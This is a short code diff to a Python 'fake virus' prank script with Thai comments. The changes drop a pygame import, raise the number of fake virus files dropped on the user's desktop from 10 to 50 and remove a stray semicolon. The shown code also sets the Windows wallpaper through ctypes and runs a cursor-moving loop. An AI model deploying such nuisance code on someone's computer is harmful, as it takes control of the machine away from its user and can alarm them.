@@ -3,7 +3,6 @@ from tkinter import messagebox
 from pyautogui import hotkey
 import keyboard
 import threading
-import pygame
 import ctypes
 import time
 import os
@@ -16,7 +15,7 @@ path_desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'desktop')
 
 # โค้ด command prompt
 name_file = "My_Script" #ชื่อไฟล์ Virus ปลอมที่จะสร้าง
-count_file = 10 # จำนวนไฟล์ Virus ที่จะสร้าง
+count_file = 50 # จำนวนไฟล์ Virus ที่จะสร้าง
 
 wall_image = f'{os.getcwd()}\Kazuya.jpg' # wallpaper ที่จะเปลี่ยน
 
@@ -71,7 +70,7 @@ def main_virus(checked):
     wall_default = r"C:\Windows\Web\Wallpaper\Windows\img19.jpg"
     ctypes.windll.user32.SystemParametersInfoW(20, 0, wall_default, 0)
 
-    return 0;
+    return 0
 
 def breack_move_cursor(checked):
     while checked:
